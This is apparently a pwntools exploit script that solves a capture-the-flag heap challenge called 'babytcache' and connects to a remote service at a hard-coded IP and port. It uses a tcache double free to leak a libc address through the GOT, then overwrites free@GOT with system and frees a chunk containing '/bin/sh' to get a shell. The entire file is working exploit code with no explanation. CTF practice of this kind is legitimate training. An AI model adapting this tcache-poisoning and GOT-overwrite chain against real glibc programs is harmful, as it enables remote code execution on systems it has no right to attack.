from pwn import *
context.log_level = "debug"

p = process("./babytcache")
p = remote("118.24.3.214" , 12341)
elf = ELF("./babytcache")
libc = ELF("./libc-2.27.so")

cmd = lambda c : p.sendlineafter(">" , str(c))
def add(content):
	cmd(1)
	if len(content) != 0x50:
		content += "\n"
	p.sendafter("content:" , content)

def delete(index):
	cmd(2)
	p.sendlineafter("index:" , str(index))

def show(index):
	cmd(3)
	p.sendlineafter("index:" , str(index))

stdout = 0x6020A0
got = 0x602000
add("padding") 
add("padding")
add("padding")
# leak # tcache double free
delete(0) 
delete(0)
for i in range(2):
	add(p64(stdout + 0x10))
payload = "/bin/sh\x00" + p64(0) + p64(2) + p64(stdout + 0x10) * 3 + p64(elf.got["free"])[:7]
add(payload)
show(0)
free_addr = u64(p.recvuntil("\x7f").ljust(8 , "\x00"))
log.success("free : " + hex(free_addr))
libc.address = free_addr - libc.sym["free"]
# getshell normal double free
delete(1)
delete(2)
delete(1)
add(p64(got + 2 - 8))
add("padding")
add("padding")
add("a" * 14 + p64(libc.sym["system"])[:7])
delete(-1)
p.interactive()